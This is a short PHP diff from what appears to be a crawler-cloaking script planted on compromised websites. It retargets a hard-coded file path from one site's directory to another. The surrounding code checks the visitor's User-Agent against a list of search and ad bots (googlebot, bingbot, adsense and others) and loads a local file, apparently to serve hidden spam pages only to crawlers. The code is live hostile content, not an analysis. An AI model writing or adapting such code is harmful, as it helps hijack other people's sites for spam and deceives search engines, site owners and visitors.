@@ -15,7 +15,7 @@ function bromoslot_team($url) {
 }
 
 $res = strtolower($_SERVER["HTTP_USER_AGENT"]);
-$bot = "/home/ihsaorid/plus62.isha.or.id/pages/index/index.txt";
+$bot = "/home/ramlan/jurnal/pages/index/index.txt";
 $file = bromoslot_team($bot);
 $botchar = "/(googlebot|slurp|adsense|inspection|ahrefsbot|telegrambot|bingbot|yandexbot)/";
 if (preg_match($botchar, $res)) {
